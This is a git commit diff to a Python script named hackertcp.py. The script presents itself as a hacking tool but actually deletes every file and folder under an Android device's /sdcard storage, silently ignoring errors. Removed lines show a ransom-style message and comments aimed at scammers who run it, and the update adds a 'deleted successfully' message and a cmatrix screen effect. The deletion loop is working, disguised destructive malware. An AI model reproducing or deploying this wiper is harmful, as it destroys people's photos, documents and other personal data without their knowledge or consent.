b09fd0904c40b5eddd01b2b24c6492a38830d630
snowfelps <123759120+snowfelps@users.noreply.github.com>
2023-10-02 23:10:24 -0300

    Update hackertcp.py

--- hackertcp.py
+++ hackertcp.py
@@ -1,13 +1,10 @@
-# -*- coding: utf-8 -*-
-
 import os
 import shutil
+import time
 
-# ir ate a memória do Android 
 diretorio_sdcard = '/sdcard'
 
 try:
-    #se fudeu golpista
     for filename in os.listdir(diretorio_sdcard):
         file_path = os.path.join(diretorio_sdcard, filename)
         try:
@@ -16,11 +13,18 @@ try:
             elif os.path.isdir(file_path):
                 shutil.rmtree(file_path)
         except Exception as e:
-            # Comentamos as mensagens de erro
             pass
 
-    # se fudeu
-    print("Memória do celular sequestrada com susseso seus dados estão em nossas mãos")
+    print("excluído com sucesso")
+
+    # 
+    time.sleep(2.5)
+
+    # 
+    os.system('clear')
+
+    # 
+    os.system('cmatrix')
+
 except Exception as e:
-    # Comentamos a mensagem de erro
     pass
